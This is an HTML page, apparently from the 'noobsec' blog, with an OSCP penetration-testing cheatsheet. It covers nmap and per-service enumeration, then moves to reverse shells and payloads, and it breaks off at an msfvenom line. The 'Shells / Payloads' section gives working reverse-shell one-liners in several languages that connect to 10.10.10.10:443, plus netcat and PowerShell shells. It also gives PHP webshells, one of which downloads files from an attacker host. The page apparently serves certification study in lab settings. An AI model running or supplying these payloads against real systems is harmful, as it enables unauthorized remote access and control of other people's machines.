@@ -1,0 +1,1203 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang='en-us'><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>OSCP Cheatsheet - Welcome to noobsec</title>
+
+    
+
+    
+    <meta name="keywords" content="oscp,offensive security,cheatsheet,oscp cheatsheet,oscp cheat sheet,pen200 cheatsheet,nmap,file transfer cheat sheet" />
+    
+
+    
+    <meta name="author" content="karan bhayani" />
+    
+
+    
+        <meta property="og:title" content="OSCP Cheatsheet" />
+<meta property="og:description" content="OSCP Cheatsheet General Enumeration - Nmap Replace $ip with target IP
+Initial scan
+nmap -Pn -n -vvv -oN nmap/initial $ipIf no ports are found, scan in parts
+nmap -Pn -n -vvv -p1-500 -oN nmap/partial $ipScan all ports
+nmap -Pn -n -vvv -p- -oN nmap/allports $ipTargeted scanning
+nmap -Pn -n -vvv -p22,80 -oN nmap/targeted $ipUDP Scanning
+sudo nmap -Pn -n -vvv -sU -oN nmap/udp $ipAutomated nmap scanning (my preference is nmapAutomator, never missed a port)" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/oscp-cheatsheet/" /><meta property="article:section" content="" />
+<meta property="article:published_time" content="2020-06-25T08:51:22+00:00" />
+<meta property="article:modified_time" content="2020-06-25T08:51:22+00:00" />
+
+
+    
+
+    
+        <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="OSCP Cheatsheet"/>
+<meta name="twitter:description" content="OSCP Cheatsheet General Enumeration - Nmap Replace $ip with target IP
+Initial scan
+nmap -Pn -n -vvv -oN nmap/initial $ipIf no ports are found, scan in parts
+nmap -Pn -n -vvv -p1-500 -oN nmap/partial $ipScan all ports
+nmap -Pn -n -vvv -p- -oN nmap/allports $ipTargeted scanning
+nmap -Pn -n -vvv -p22,80 -oN nmap/targeted $ipUDP Scanning
+sudo nmap -Pn -n -vvv -sU -oN nmap/udp $ipAutomated nmap scanning (my preference is nmapAutomator, never missed a port)"/>
+
+    <link rel="stylesheet" href="/style.css" integrity="">
+
+
+
+    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">
+
+
+        
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-171056200-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+    
+
+    
+    <script>
+        if (!('theme' in localStorage)) {
+            localStorage.theme = 'light';
+        }
+
+        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+            document.documentElement.setAttribute("data-theme", "dark");
+        } else {
+            document.documentElement.setAttribute("data-theme", "light");
+        }
+    </script>
+<script defer src="/js/header.js" integrity=""></script>
+
+
+
+    <script defer src="/js/zooming.js" integrity=""></script>
+
+
+
+
+
+
+
+    
+        
+
+        
+        
+
+        
+        
+            
+        
+
+        <script defer src="/js/prism.js" integrity="" data-manual></script>
+    
+
+
+
+    
+    
+    
+    <script defer src="/js/search-en-us.js" integrity=""></script>
+
+
+
+
+
+</head>
+<body>
+        <main><header>
+    <div class="brand">
+        <div id="sidebar_btn">
+            <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
+</svg>
+
+</svg>
+        </div>
+
+        <div>
+            <a href="/">noobsec</a>
+        </div>
+    </div>
+
+    <div class="toolbox">
+        <div id="theme_tool">
+            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+</svg>
+
+</svg>
+            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+</svg>
+
+</svg>
+        </div>
+
+        
+            <div id="search_tool">
+                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+</svg>
+
+</svg><div id="search_menu_wrapper" class="hidden">
+    <div id="search_menu">
+        <div id="search_menu_toolbar">
+            <div id="search_menu_input_wrapper">
+                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            </div>
+            <div id="search_menu_close_btn">
+                <svg width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
+</svg>
+
+</svg>
+            </div>
+        </div>
+        <div id="search_menu_results">
+        </div>
+    </div>
+</div>
+</div>
+        
+
+        
+    </div>
+</header>
+<nav id="navbar" class="pure-menu">
+    <ul class="pure-menu-list"><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">OSCP</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/oscp-cheatsheet" class="pure-menu-link">OSCP Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-linux" class="pure-menu-link">Linux PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-windows" class="pure-menu-link">Windows PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/ad-cheatsheet" class="pure-menu-link">OSCP AD Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/oscp-journey" class="pure-menu-link">OSCP Journey</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/bof" class="pure-menu-link">OSCP BOF</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">HTB</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-bart" class="pure-menu-link">HTB Bart</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit" class="pure-menu-link">HTB Falafel</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-cronos" class="pure-menu-link">HTB Cronos</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-bashed" class="pure-menu-link">HTB Bashed</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-lame" class="pure-menu-link">HTB Lame</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">Web Attacks</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/file-inclusion" class="pure-menu-link">File Inclusion</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-0x01" class="pure-menu-link">SQLi 0x01</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-0x02" class="pure-menu-link">SQLi 0x02</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-0x03" class="pure-menu-link">SQLi 0x03</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-cheatsheet" class="pure-menu-link">SQLi Cheatsheet</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">Cheatsheets</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/oscp-cheatsheet" class="pure-menu-link">OSCP Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-linux" class="pure-menu-link">Linux PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-windows" class="pure-menu-link">Windows PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/ad-cheatsheet" class="pure-menu-link">AD Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/crtp-cheatsheet" class="pure-menu-link">CRTP Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-cheatsheet" class="pure-menu-link">SQLi Cheatsheet</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/starting-point" class="pure-menu-link">Getting Started in Red Team</a>
+                    
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/whoami/" class="pure-menu-link">About</a>
+                    
+                </li></ul>
+</nav>
+<div id="sidebar_canvas_overlay" class="hidden"></div>
+<div id="sidebar" class="close">
+    <ul><li>
+                    <details>
+                        <summary><a href="#">OSCP</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">OSCP AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/oscp-journey">OSCP Journey</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/bof">OSCP BOF</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <details>
+                        <summary><a href="#">HTB</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bart">HTB Bart</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit">HTB Falafel</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-cronos">HTB Cronos</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bashed">HTB Bashed</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-lame">HTB Lame</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <details>
+                        <summary><a href="#">Web Attacks</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/file-inclusion">File Inclusion</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-0x01">SQLi 0x01</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-0x02">SQLi 0x02</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-0x03">SQLi 0x03</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <details>
+                        <summary><a href="#">Cheatsheets</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/crtp-cheatsheet">CRTP Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <a href="/starting-point">Getting Started in Red Team</a>
+                </li><li>
+                    <a href="/whoami/">About</a>
+                </li></ul>
+</div><div id="content" class="content-margin">
+                
+    
+    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#general-enumeration---nmap">General Enumeration - Nmap</a></li>
+    <li><a href="#banner-grabbing">Banner Grabbing</a></li>
+    <li><a href="#port-21---ftp">Port 21 - FTP</a></li>
+    <li><a href="#port-22---ssh">Port 22 - SSH</a></li>
+    <li><a href="#port-53---dns">Port 53 - DNS</a></li>
+    <li><a href="#port-79---finger">Port 79 - Finger</a></li>
+    <li><a href="#port-80443---https">Port 80/443 - HTTP(S)</a></li>
+    <li><a href="#port-110---pop3">Port 110 - POP3</a></li>
+    <li><a href="#port-139445---smb">Port 139/445 - SMB</a></li>
+    <li><a href="#port-161---snmp">Port 161 - SNMP</a></li>
+    <li><a href="#port-2049---nfs">Port 2049 - NFS</a></li>
+    <li><a href="#shells--payloads">Shells / Payloads</a>
+      <ul>
+        <li><a href="#universal-listeners">Universal Listeners</a></li>
+        <li><a href="#linux">Linux</a></li>
+        <li><a href="#windows">Windows</a></li>
+        <li><a href="#php-webshells">PHP Webshells</a></li>
+        <li><a href="#metasploit">Metasploit</a></li>
+      </ul>
+    </li>
+    <li><a href="#upgrading-your-shell---linux">Upgrading your shell - Linux</a>
+      <ul>
+        <li><a href="#escaping-jailed-shells">Escaping jailed Shells</a></li>
+      </ul>
+    </li>
+    <li><a href="#file-transfers">File Transfers</a>
+      <ul>
+        <li><a href="#server">Server</a></li>
+        <li><a href="#linux---http">Linux - HTTP</a></li>
+        <li><a href="#windows-1">Windows</a></li>
+      </ul>
+    </li>
+    <li><a href="#port-forwarding">Port Forwarding</a>
+      <ul>
+        <li><a href="#linux-1">Linux</a></li>
+        <li><a href="#windows-2">Windows</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#windows-3">Windows</a></li>
+        <li><a href="#linux-2">Linux</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        
+    </div></details>
+
+
+
+    <div class="content-margin">
+
+
+
+<article >
+    
+    
+        
+        
+    
+    <h1 id="oscp-cheatsheet">OSCP Cheatsheet</h1>
+<h2 id="general-enumeration---nmap">General Enumeration - Nmap</h2>
+<p><strong>Replace $ip with target IP</strong></p>
+<p>Initial scan</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"> nmap -Pn -n -vvv -oN nmap/initial $ip
+</code></pre>
+<p>If no ports are found, scan in parts</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"> nmap -Pn -n -vvv -p1-500 -oN nmap/partial $ip
+</code></pre>
+<p>Scan all ports</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"> nmap -Pn -n -vvv -p- -oN nmap/allports $ip
+</code></pre>
+<p>Targeted scanning</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"> nmap -Pn -n -vvv -p22,80 -oN nmap/targeted $ip
+</code></pre>
+<p>UDP Scanning</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash">sudo nmap -Pn -n -vvv -sU -oN nmap/udp $ip
+</code></pre>
+<p>Automated nmap scanning (my preference is <em>nmapAutomator</em>, never missed a port)</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"># It is recommended to scan ONE IP at a time
+# Do NOT overload the network
+# All scans, consecutively: Quick, Targeted, UDP, All ports, Vuln scan, CVE scan, Gobuster, Nikto
+ nmapAutomator ip All
+</code></pre>
+<h2 id="banner-grabbing">Banner Grabbing</h2>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"> telnet ip port
+ nc -nv ip port
+ curl -iv $ip
+</code></pre>
+<h2 id="port-21---ftp">Port 21 - FTP</h2>
+<p>Nmap script scanning - will reveal anonymous access</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"> nmap -Pn -n -vvv -p21 -sC -sV $ip
+</code></pre>
+<p>Checking anonymous access manually</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"> ftp ip
+ftp&gt; USER anonymous
+ftp&gt; PASS anonymous
+</code></pre>
+<p>Easy view of FTP content - Browse to:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash">ftp://$ip
+</code></pre>
+<p>Uploading a binary or webshell</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash">ftp&gt; binary
+ftp&gt; put file/name
+</code></pre>
+<h2 id="port-22---ssh">Port 22 - SSH</h2>
+<p>Additional banner grabbing</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"> ssh root@$ip
+</code></pre>
+<h2 id="port-53---dns">Port 53 - DNS</h2>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"># Get nameservers and domain name of the IP address
+nslookup
+nslookup&gt; server $target_ip
+nslookup&gt; $target
+# o/p: ns1.example.com
+
+# Get all sub-domains
+host -l -a example.com $target_ip # or ns1.example.com
+</code></pre>
+<h2 id="port-79---finger">Port 79 - Finger</h2>
+<p>Run <a href="http://pentestmonkey.net/tools/user-enumeration/finger-user-enum">this script</a> with following wordlist</p>
+<pre  class="mc-prism hide language-text" ><code>/usr/share/metasploit-framework/data/wordlists/unix_users.txt
+</code></pre>
+<h2 id="port-80443---https">Port 80/443 - HTTP(S)</h2>
+<p>Get web server, version, potential OS</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash">curl -i http://ip
+</code></pre>
+<p>Use <a href="https://www.wappalyzer.com/download">Wappalyzer</a> to identify technologies, web server, OS, database server deployed</p>
+<p><code>View-Source</code> of pages to find interesting comments, directories, technologies, web application being used, etc.</p>
+<p>Finding hidden content
+Scanning each sub-domain and interesting directory is a good idea</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"># Use small common wordlist first
+# Use big wordlist next
+# Use CMS specific wordlist if one is found
+gobuster dir -u http://$ip -w /wordlist -o gobust.out
+# Find technology specific content 
+gobuster dir -u http://$ip -w /wordlist -o gobust_php.out -x php
+# Find hidden notes, readme, changelog
+gobuster dir -u http://$ip -w /wordlist -o gobust_txt.out -x txt
+</code></pre>
+<p>Files to browse manually</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash">/robots.txt
+/sitemap.xml
+# Make it throw an error
+/doesnotexist
+</code></pre>
+<p>Run web server scanning</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"># Identifies CMS
+# Identifies Shellshock
+nikto -host $ip -o nikto.txt
+</code></pre>
+<p><strong>Web application specific scanning</strong>
+WordPress, use <a href="https://wpvulndb.com/api">API</a></p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash">wpscan --url http://$ip -e p,t,u --detection-mode aggressive &gt; wpscan.log
+</code></pre>
+<p>Drupal, found <a href="https://github.com/droope/droopescan">here</a></p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash">droopescan scan drupal http://$ip -t 32
+</code></pre>
+<h2 id="port-110---pop3">Port 110 - POP3</h2>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"># Login
+telnet $ip 110
+USER test
+PASS test
+
+# List and view mails
+# O/P: &lt;mail_number&gt; &lt;mail_length&gt;
+list
+# View mail
+retr &lt;mail_number&gt;
+quit
+</code></pre>
+<h2 id="port-139445---smb">Port 139/445 - SMB</h2>
+<p>General enumeration</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash">nmap -Pn -n -p139,445 --script smb-* $ip
+enum4linux -a $ip
+</code></pre>
+<p>Enumerate hostname</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash">nmblookup -A $ip
+</code></pre>
+<p>Get version - script available <a href="https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh">here</a></p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash">./smbver.sh $ip [port]
+msf&gt;use auxiliary/scanner/smb/smb_version
+</code></pre>
+<p>List shares
+Note: <code>smbmap</code> will state access type available, smbclient will <em>NOT</em>. To check access type using smbclient, it’s best to access each share, read a file, and write a file.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash">smbmap -H $ip
+# Get share items recursively
+smbmap -H $ip -R &lt;share&gt;
+smbmap -H $ip -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt;
+smbclient -L \\$ip -N
+# Protocol Error?
+smbclient -L \\$ip -N --option='client min protocol=NT1'
+smbclient -L \\$ip -U &lt;user&gt;
+</code></pre>
+<p>Connecting to a share</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"># Anonymously
+smbclient //$ip/share -N
+# Authenticated
+smbclient //$ip/share -U &lt;username&gt;
+# Protocol Error?
+smbclient //$ip/share -N --option='client min protocol=NT1'
+</code></pre>
+<h2 id="port-161---snmp">Port 161 - SNMP</h2>
+<table class="mc-table">
+<thead>
+<tr>
+<th>MIB Values</th>
+<th>Windows Parameters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1.3.6.1.2.1.25.1.6.0</td>
+<td>System Processes</td>
+</tr>
+<tr>
+<td>1.3.6.1.2.1.25.4.2.1.2</td>
+<td>Running Programs</td>
+</tr>
+<tr>
+<td>1.3.6.1.2.1.25.4.2.1.4</td>
+<td>Processes Path</td>
+</tr>
+<tr>
+<td>1.3.6.1.2.1.25.2.3.1.4</td>
+<td>Storage Units</td>
+</tr>
+<tr>
+<td>1.3.6.1.2.1.25.6.3.1.2</td>
+<td>Software Name</td>
+</tr>
+<tr>
+<td>1.3.6.1.4.1.77.1.2.25</td>
+<td>User Accounts</td>
+</tr>
+<tr>
+<td>1.3.6.1.2.1.6.13.1.3</td>
+<td>TCP Local Ports</td>
+</tr>
+</tbody>
+</table>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"># Brute force community strings
+# echo public &gt; community
+# echo private &gt;&gt; community
+# echo manager &gt;&gt; community
+# for ip in $(seq 1 254);do echo 10.11.1.$ip;done &gt; snmp-ips
+onesixtyone -c community -i snmp-ips
+
+# Enumerate entire MIB tree
+snmpwalk -c public -v1 $ip
+# Enumerate specific MIB Value
+snmpwalk -c public -v1 $ip $MIB_Value
+
+snmp-check $ip
+</code></pre>
+<h2 id="port-2049---nfs">Port 2049 - NFS</h2>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"># NFS &lt; v4
+# Enumerating shares available, and mount points
+showmount -e $ip
+showmount -a $ip
+
+# Mounting, x = NFS Version
+mount -t nfs -o vers=x $ip:&lt;share&gt; &lt;local_dir&gt;
+
+# On target machine
+# Find mount points on the target where SUID programs and scripts can be run from 
+mount | grep 'nosuid\|noexec'
+</code></pre>
+<h2 id="shells--payloads">Shells / Payloads</h2>
+<h3 id="universal-listeners">Universal Listeners</h3>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"># Netcat
+[sudo] rlwrap nc -nvlp &lt;port&gt;
+
+# msf multi/handler
+msf(exploit/multi/handler)&gt; set payload path/to/payload
+msf(exploit/multi/handler)&gt; set LHOST &lt;ip&gt; # or &lt;interface&gt;
+msf(exploit/multi/handler)&gt; set LPORT &lt;port&gt;
+</code></pre>
+<h3 id="linux">Linux</h3>
+<hr>
+<h4 id="one-liners">One-liners</h4>
+<p>Credit to <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest Monkey</a></p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"># bash
+/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1&quot;
+
+# Perl
+perl -e 'use Socket;$i=&quot;10.10.10.10&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+
+# Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.10&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+
+# PHP
+php -r '$sock=fsockopen(&quot;10.10.10.10&quot;,443);exec(&quot;/bin/sh -i &amp;3 2&gt;&amp;3&quot;);'
+
+# Ruby
+ruby -rsocket -e'f=TCPSocket.open(&quot;10.10.10.10&quot;,443).to_i;exec sprintf(&quot;/bin/sh -i &amp;%d 2&gt;&amp;%d&quot;,f,f,f)'
+
+# Netcat : -u for UDP
+nc [-u] 10.10.10.10 443 -e /bin/bash
+
+# Netcat without -e : -u for UDP
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc [-u] 10.10.10.10 443 &gt; /tmp/f
+
+# Java
+r = Runtime.getRuntime()
+p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5/dev/tcp/10.10.10.10/443;cat &amp;5 &gt;&amp;5; done&quot;] as String[])
+p.waitFor()
+</code></pre>
+<h4 id="reverse-shell-scripts">Reverse shell scripts</h4>
+<p>PHP reverse shell available <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">here</a> or locally
+<code>/usr/share/webshells/php/php-reverse-shell</code></p>
+<p>Python PTY shells available <a href="https://github.com/infodox/python-pty-shells">here</a></p>
+<h3 id="windows">Windows</h3>
+<p>PowerShell reverse shell available <a href="https://github.com/samratashok/nishang">here</a>
+PHP reverse shell available <a href="https://github.com/Dhayalanb/windows-php-reverse-shell">here</a>
+Netcat for Windows available <a href="https://eternallybored.org/misc/netcat/">here</a></p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"># PowerShell
+cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
+vi shell.ps1
+# go to end of file, paste the following
+Invoke-PowerShellTcp -Reverse -IPAddress [attacker_ip] -Port [attacker_port]
+# close, reverse shell ready to use
+
+# Netcat - use x64 or x32 as per target. powershell.exe or cmd.exe
+nc.exe x.x.x.x &lt;port&gt; -e powershell.exe
+</code></pre>
+<h3 id="php-webshells">PHP Webshells</h3>
+<pre  class="mc-prism hide language-text" ><code class="language-PHP"># Basic. system() or shell_exec() or exec()
+&lt;?php system($_GET['cmd']);?&gt;
+
+# More functional
+&lt;?php
+$ip = 'http://10.10.14.4/' # [:port] . Change this
+# Upload
+if (isset($_GET['fupload'])) {
+    file_put_contents($_GET['fupload'], file_get_contents($ip . $_GET['fupload']));
+};
+# Execute code
+# shell_exec() or system() or exec()
+if (isset($_GET['cmd'])) {
+    echo &quot;&lt;pre&gt;&quot; . exec($_GET['cmd']) . &quot;&lt;/pre&gt;&quot;;
+};
+?&gt;
+</code></pre>
+<h3 id="metasploit">Metasploit</h3>
+<h4 id="system-binaries">System Binaries</h4>
+<pre  class="mc-prism hide language-text" ><code class="language-bash"># Linux reverse shell - Staged
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f elf &gt; shell
+# Linux reverse shell - Stageless
